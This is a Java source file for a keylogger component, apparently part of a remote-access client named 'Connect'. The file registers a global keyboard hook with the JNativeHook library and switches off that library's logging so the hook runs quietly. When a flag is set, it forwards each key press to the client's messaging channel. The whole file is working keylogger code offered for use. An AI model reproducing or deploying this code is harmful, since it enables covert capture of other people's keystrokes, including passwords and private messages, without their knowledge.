package br.com.introcdc.connect.client.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 16/01/2025 - 02:11
 */

import br.com.introcdc.connect.client.ConnectClient;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class KeyLoggerComponents implements NativeKeyListener {

    // Key Logger Variables
    public static boolean KEY_LOGGER = false;

    public static void startKeyLogger() {
        try {
            LogManager.getLogManager().reset();
            Logger logger = Logger.getLogger(KeyLoggerComponents.class.getPackage().getName());
            logger.setLevel(Level.OFF);

            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new KeyLoggerComponents());
        } catch (Exception exception) {
            ConnectClient.msg("Ocorreu um erro ao iniciar o keylogger");
            ConnectClient.exception(exception);
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent event) {
        if (!KEY_LOGGER) {
            return;
        }
        String keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
        ConnectClient.msg("keylogger " + keyText);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent event) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent event) {
    }

}
